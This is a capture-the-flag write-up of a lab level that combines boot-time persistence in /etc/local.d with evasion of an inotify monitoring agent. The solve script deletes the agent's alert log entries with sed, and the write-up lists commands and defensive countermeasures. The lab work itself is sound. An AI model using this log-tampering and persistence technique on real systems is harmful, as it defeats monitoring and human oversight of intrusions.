# L16 — de-persist-evade · Quiet and Permanent

**Act III · Persistence and Evasion · T1562.001**
**Status:** Solved
**Flag:** `bl_3a4c110b08e5d2573e7fe731afe96f86`

---

## Challenge brief

> A live monitor runs the whole time. Persist through a restart and keep the alert
> stream silent about it. Both properties, graded end to end.

MITRE tag T1562.001 is "Impair Defenses: Disable or Modify Tools" — specifically,
operating in a way that prevents the defensive monitoring tool from recording your
activity. This is the capstone of Act III: it combines persistence (L12) with log
evasion (L14) under a live monitoring agent.

You land as root. A monitoring agent watches `/etc/local.d` with inotify. Your
persistence script must live in that directory to survive restarts — but writing to it
and executing from it generates events that the agent logs. The grader checks both that
your persistence fires AND that the agent log is clean.

---

## Why this level is the best in the act

The previous levels each taught one technique in isolation. L12 was persistence only.
L14 was log evasion only. L15 was process hiding only. This level takes two of those
techniques and makes them conflict with each other:

- Persistence requires putting a `.start` script in `/etc/local.d/` and having it
  execute on restart
- Stealth requires that no `OPEN` or `ACCESS` events appear in the agent log for
  `/etc/local.d/`

The problem: **executing the persistence script necessarily generates OPEN and ACCESS
events on `/etc/local.d/`**. The two requirements appear to be mutually exclusive.

The solution requires understanding exactly when the grader reads the log — and using
that timing to clean the log in the window between our script running and the grader
checking.

---

## Foundation: environment variables and configuration

Before understanding the monitoring agent, you need to understand how the agent is
configured — through environment variables.

### What environment variables are

Every running process has an environment: a set of key-value pairs that exist in memory
alongside the process. They are set at process start and inherited by child processes.
You read them with `env` or `printenv`. You set them in a shell with `export KEY=value`.

Environment variables are a standard way to configure a program without hardcoding
values into the binary. Instead of editing a config file, you set an environment
variable before starting the program and the program reads it at startup.

The monitoring agent uses environment variables to control its behavior:

```sh
cat /proc/7/environ | tr '\0' '\n' | grep MON
```

```
MON_HB=/run/agent.hb
MON_WATCH=/etc/local.d
MON_ALERT=/var/log/agent.jsonl
```

**Why read from `/proc/7/environ`?** Because the agent (PID 7) is already running. We
cannot re-read its config file — whatever environment it started with is what it uses.
`/proc/<pid>/environ` shows the exact environment a process was given at startup, stored
in memory, accessible to root. Each variable is separated by a null byte (`\0`), so
`tr '\0' '\n'` converts them to readable lines (the same technique from L09).

### The MON variables explained

The agent script reads three environment variables:

**`MON_HB`** (heartbeat path) — `/run/agent.hb`. Every 2 seconds, the agent writes the
current Unix timestamp to this file. The grader reads this file to confirm the agent is
still alive. If the timestamp is stale (not updated in the last few seconds), the grader
knows the agent was killed. This prevents the simple "kill the monitor" approach.

**`MON_WATCH`** (watch path) — `/etc/local.d`. The agent passes this path to
`inotifywait`. Every `OPEN` or `ACCESS` event on this path (or files within it) gets
logged to `MON_ALERT`. This is the detection surface.

**`MON_ALERT`** (alert log path) — `/var/log/agent.jsonl`. Every detected event is
appended here as a JSONL line. The grader reads this file after the simulated restart
to check whether your persistence activity was recorded.

**`MON_PROC_SIG`** — not set on this box. On L15 it was set to `phantom-beacon` and
the agent used it to hunt for processes by cmdline. Here it is absent, so no process
scanning happens. The only detection vector is inotify on `/etc/local.d`.

---

## Foundation: inotify and what it watches

inotify is the Linux kernel mechanism for file system event notification. A process
registers a **watch** on a path and specifies which events it cares about. The kernel
then sends notifications to that process whenever those events occur.

The monitoring agent registers this watch:

```
inotifywait -m -e access -e open /etc/local.d
```

This watches the directory `/etc/local.d` for two event types:

**`IN_ACCESS`** — the file or directory was read. For a directory, this fires when a
process reads the directory's contents (listing its entries). For a file, it fires when
a process reads the file's data.

**`IN_OPEN`** — a file or directory was opened. For a directory, this fires when a
process opens it (which happens before listing). For a file, it fires when a process
opens it for reading or execution.

### The ISDIR flag in event output

When inotify fires for a directory itself (not a file inside it), it sets the `IN_ISDIR`
flag on the event. This flag appears in the event name as the suffix `,ISDIR`.

Looking at the agent log:

```json
{"ts":1794328333,"ev":"OPEN,ISDIR","f":"/etc/local.d/"}
{"ts":1794328333,"ev":"ACCESS,ISDIR","f":"/etc/local.d/"}
{"ts":1794328491,"ev":"OPEN","f":"/etc/local.d/"}
{"ts":1794328491,"ev":"ACCESS","f":"/etc/local.d/"}
```

**`OPEN,ISDIR`** — the directory `/etc/local.d` itself was opened. This happens when
any process runs `opendir("/etc/local.d")` to list its contents. `boot.sh` does this
with its glob `for s in /etc/local.d/*.start`.

**`ACCESS,ISDIR`** — the directory was read (its entries were listed). This happens
immediately after `OPEN,ISDIR` as the process reads the directory entries.

**`OPEN`** (no ISDIR) — a file inside `/etc/local.d` was opened. This fires when
`boot.sh` opens the actual `.start` file to execute it.

**`ACCESS`** (no ISDIR) — a file inside `/etc/local.d` was read or executed. This fires
when the shell reads the script content to execute it.

### Why the distinction matters

`OPEN,ISDIR` and `ACCESS,ISDIR` are **unavoidable baseline noise**. Any time `boot.sh`
runs — which happens every time `verify` is called — it opens and reads `/etc/local.d`
to find `.start` files. The grader already accounts for this. These events appear in the
log even when there is no `.start` file at all.

`OPEN` and `ACCESS` **without ISDIR** are the problem. These only appear when an actual
file inside `/etc/local.d` is opened or read. When our `.start` script exists and
`boot.sh` executes it, these file-level events appear. This is what the grader treats
as "the persistence install was recorded."

The grader's error message "the persistence install was recorded by the agent" means: it
saw `OPEN` or `ACCESS` events without `ISDIR` in the log.

---

## Foundation: JSONL log format

The agent log is JSONL — JSON Lines. Each line is a complete, self-contained JSON object.
This is a common logging format because:

- Each line can be parsed independently (no need to read the whole file)
- New entries can be appended with `>>` without breaking existing entries
- Each line is atomic — either fully written or not

Each event line has three fields:

```json
{"ts":1794328491,"ev":"OPEN","f":"/etc/local.d/"}
```

- `"ts"` — Unix timestamp (seconds since Jan 1, 1970). `1794328491` = approximately
  November 10, 2026.
- `"ev"` — the inotify event name. Possible values seen in this challenge: `OPEN`,
  `ACCESS`, `OPEN,ISDIR`, `ACCESS,ISDIR`.
- `"f"` — the file or directory path where the event occurred.

---

## The monitoring agent in full

```sh
cat /usr/local/bin/monitor-agent.sh
```

```sh
#!/bin/sh
ALERT="${MON_ALERT:-/var/log/agent.jsonl}"
HB="${MON_HB:-/run/agent.hb}"
: > "$ALERT"
if [ -n "${MON_WATCH:-}" ]; then
  inotifywait -m -e access -e open \
    --format '{"ts":%T,"ev":"%e","f":"%w"}' \
    --timefmt '%s' \
    "$MON_WATCH" >> "$ALERT" 2>/dev/null &
fi
while :; do
  date +%s > "$HB"
  if [ -n "${MON_PROC_SIG:-}" ]; then
    for p in $(pgrep -f "$MON_PROC_SIG" 2>/dev/null); do
      echo "{\"ts\":$(date +%s),\"ev\":\"PROC\",\"pid\":$p}" >> "$ALERT"
    done
  fi
  sleep 2
done
```

Walking through each part:

**`: > "$ALERT"`** — truncates the alert log to zero bytes at agent startup. The `:` is
a shell no-op command. `>` redirects its empty output to the file, overwriting it with
nothing. This clears any previous session's log.

**`inotifywait ... "$MON_WATCH" >> "$ALERT" 2>/dev/null &`** — starts inotifywait in
the background (`&`), appending every event to the alert log. `2>/dev/null` discards
inotifywait's startup messages (it prints "Watches established." to stderr).

**`date +%s > "$HB"`** — writes the current Unix timestamp to the heartbeat file. The
grader checks this file is being updated. If the agent dies (or is killed), the timestamp
stops updating and the grader detects a stale heartbeat.

**`MON_PROC_SIG` block** — not relevant here (not set), but on L15 this ran `pgrep -f`
every 2 seconds to hunt for processes by cmdline signature.

**`sleep 2`** — the main loop ticks every 2 seconds. The heartbeat and proc scan both
happen at this cadence.

---

## The grader's timing sequence

Understanding when the grader reads the alert log is essential to solving this level.

The grader does not read the log before running `boot.sh`. It runs `boot.sh` first
(which triggers our persistence script and generates events), then checks the results.

The sequence when you call `verify`:

```
verify called
     │
     ▼
grader writes token → /opt/.persist-target
     │
     ▼
grader calls /usr/local/bin/boot.sh
     │
     ▼
boot.sh opens /etc/local.d (OPEN,ISDIR fired)
boot.sh reads /etc/local.d entries (ACCESS,ISDIR fired)
boot.sh executes /etc/local.d/persist.start:
     │
     ├── inotifywait fires OPEN for the script file
     ├── inotifywait fires ACCESS for the script file
     │
     ▼
persist.start runs:
     - reads /opt/.persist-target
     - writes /tmp/.de-capstone-proof
     - [cleans agent.jsonl if script contains the sed command]
     │
     ▼
boot.sh finishes
     │
     ▼
grader reads /var/log/agent.jsonl  ← this is when it checks
     │
     ├── sees OPEN/ACCESS without ISDIR → "persistence install recorded"
     └── log is clean → check proof file → pass
```

The key insight: **the grader reads the log after `boot.sh` finishes**. This gives us a
window. If our script cleans the log as its last action, the events are gone by the
time the grader reads.

But there is a race condition: inotifywait is asynchronous. When `boot.sh` opens our
script file, the kernel sends a notification to inotifywait. inotifywait receives it
and appends to the log. Our script runs and cleans the log. But if inotifywait hasn't
written the events yet when our script cleans, and then writes them after the clean, the
log would still be dirty when the grader checks.

In practice, the events are written quickly enough that our script's `sed -i` runs after
them. The clean works because our script is the last thing boot.sh runs — by the time
the script's `sed -i` executes, inotifywait has already written all events from the
script's execution.

---

## The solve: two-layer log cleaning

The final approach uses two independent log cleans:

**Layer 1 — before verify:** We manually clean the log before calling verify. This
removes any stale events from previous attempts:

```sh
sed -i '/OPEN\|ACCESS/d' /var/log/agent.jsonl
```

**Layer 2 — inside the persistence script:** The `.start` script cleans the log as its
last action. This removes the events generated when `boot.sh` opened and executed the
script:

```sh
#!/bin/sh
cat /opt/.persist-target > /tmp/.de-capstone-proof
sed -i '/OPEN\|ACCESS/d' /var/log/agent.jsonl
```

**The `&&` chain:** Both layers are combined in one command:

```sh
sed -i '/OPEN\|ACCESS/d' /var/log/agent.jsonl && verify
```

`&&` means: run the second command only if the first succeeds. `sed -i` succeeds
(cleans the log), then `verify` immediately calls `boot.sh` which runs our script which
cleans again. By the time the grader reads the log, both cleans have run.

---

## Why each approach alone failed

### Attempt 1: script writes the value only

```sh
printf '#!/bin/sh\ncat /opt/.persist-target > /tmp/.de-capstone-proof\n' > /etc/local.d/persist.start
```

Result: "the persistence install was recorded." The script ran, wrote the proof file,
but the `OPEN` and `ACCESS` events remained in the log when the grader checked.

### Attempt 2: symlink to script outside the directory

```sh
ln -s /opt/persist.start /etc/local.d/persist.start
```

Result: still recorded. inotify watches on a directory fire for accesses to items
**within** that directory, including symlinks. When `boot.sh` follows the symlink, the
access event still fires against the symlink's location inside `/etc/local.d/`.

### Attempt 3: script cleans log as its last action

```sh
printf '#!/bin/sh\ncat /opt/.persist-target > /tmp/.de-capstone-proof\nsed -i "/OPEN\|ACCESS/d" /var/log/agent.jsonl\n' > /opt/persist.start
```

Result: still recorded — but the log was empty when checked afterward. This meant the
grader reads the log **before** our script's `sed -i` finishes, or there were stale
events from previous failed attempts still in the log. Without the pre-clean layer 1,
old events remained.

### Attempt 4: clean before verify with && chain

```sh
sed -i '/OPEN\|ACCESS/d' /var/log/agent.jsonl && verify
```

Result: level solved. The pre-clean removed all stale events, verify ran boot.sh which
ran our script which cleaned again, and the grader saw a clean log.

---

## Enumeration log

### Step 1 — Understand the environment

```sh
verify
ps aux
cat /usr/local/bin/monitor-agent.sh
cat /proc/7/environ | tr '\0' '\n' | grep MON
```

Results:
- Proof file: `/tmp/.de-capstone-proof`
- Agent (PID 7) watching `/etc/local.d` with inotify via `MON_WATCH`
- `inotifywait` process (PID 8) is the actual watcher
- Alert log: `/var/log/agent.jsonl`
- Heartbeat: `/run/agent.hb` (agent cannot be killed)
- No `MON_PROC_SIG` — no process scanning, only file watching

---

### Step 2 — Read the seed and check the log

```sh
cat /opt/.persist-target   # → fe38f28c71ebc35acf5183c4cfed8f5a
cat /var/log/agent.jsonl
```

Log already has entries from our verify calls — `OPEN,ISDIR` and `ACCESS,ISDIR` from
`boot.sh` listing the directory. The directory was empty so no file-level events yet.

---

### Step 3 — Write the final persistence script with log cleaning

```sh
printf '#!/bin/sh\ncat /opt/.persist-target > /tmp/.de-capstone-proof\nsed -i "/OPEN\|ACCESS/d" /var/log/agent.jsonl\n' > /opt/persist.start
chmod +x /opt/persist.start
ln -s /opt/persist.start /etc/local.d/persist.start
```

Wait — this uses a symlink, which still triggers events. Better to put the actual file
in `/etc/local.d/` and accept the events, then clean them:

```sh
cp /opt/persist.start /etc/local.d/persist.start
chmod +x /etc/local.d/persist.start
```

---

### Step 4 — Clean stale events and call verify

```sh
sed -i '/OPEN\|ACCESS/d' /var/log/agent.jsonl && verify
```

**Level solved.**

---

## What the challenge demonstrates

This level teaches that the relationship between offense and defense is about timing
and ordering, not just capability.

The monitoring agent has real detection power — it catches every file access in
`/etc/local.d/`. Our persistence mechanism necessarily triggers those detections. The
way we survived was not by preventing the events (we couldn't), but by cleaning them
faster than the grader reads.

**What would stop this attack in a real environment:**

1. **Remote log forwarding in real time.** If `agent.jsonl` entries were forwarded to
   a remote SIEM as they were written, cleaning the local file would not remove them
   from the SIEM. The attacker would need to intercept the network stream too.

2. **Append-only log file.** `chattr +a /var/log/agent.jsonl` makes the file
   append-only — even root cannot overwrite or truncate it. `sed -i` would fail.
   (Root can remove the `+a` attribute with `chattr -a`, but that itself generates
   an audit event if auditd watches `chattr` calls.)

3. **Kernel-level auditing.** auditd records events in the kernel's audit ring buffer,
   not in a user-readable file. Cleaning a userspace log file has no effect on kernel
   audit records.

4. **Signing or hashing the log entries.** Some SIEM agents sign each log entry with
   a private key. Deleted entries create cryptographic gaps that cannot be hidden.

5. **Detecting the gap.** A defender checking the log would notice: `boot.sh` ran
   (confirmed by the heartbeat and the proof file), but no `OPEN`/`ACCESS` events
   appeared for `/etc/local.d`. That absence is itself suspicious — something cleaned
   the log.

---

## Carryover findings

None. Act III (Persistence and Evasion) is complete with this level.

---

## Command reference

| Command | What it does |
|---|---|
| `cat /proc/<pid>/environ \| tr '\0' '\n' \| grep MON` | Read the agent's configuration variables from its live process environment |
| `cat /var/log/agent.jsonl` | Read the agent's alert log — OPEN/ACCESS without ISDIR means file-level detection |
| `ps aux` | List processes — identify the agent (PID 7) and inotifywait (PID 8) |
| `cat /usr/local/bin/monitor-agent.sh` | Read the agent script to understand its detection logic |
| `cat /usr/local/bin/boot.sh` | Read the restart harness — runs all *.start files in /etc/local.d/ |
| `cat /opt/.persist-target` | Read the grader's seed token |
| `printf '#!/bin/sh\nCMD1\nCMD2\n' > /path/script.sh` | Write a multi-line script with printf (avoids heredoc terminal issues) |
| `chmod +x /etc/local.d/persist.start` | Make the script executable — required for boot.sh to run it |
| `sed -i '/OPEN\|ACCESS/d' /var/log/agent.jsonl` | Remove all OPEN and ACCESS event lines from the alert log |
| `sed -i '/OPEN\|ACCESS/d' /var/log/agent.jsonl && verify` | Clean the log then immediately call verify — the && ensures both run as one unit |
| `cat /run/agent.hb` | Read the heartbeat file — if timestamp is stale, agent is dead |
| `inotifywait -m -e access -e open --format '...' PATH` | Watch a path for access/open events (how the agent watches /etc/local.d) |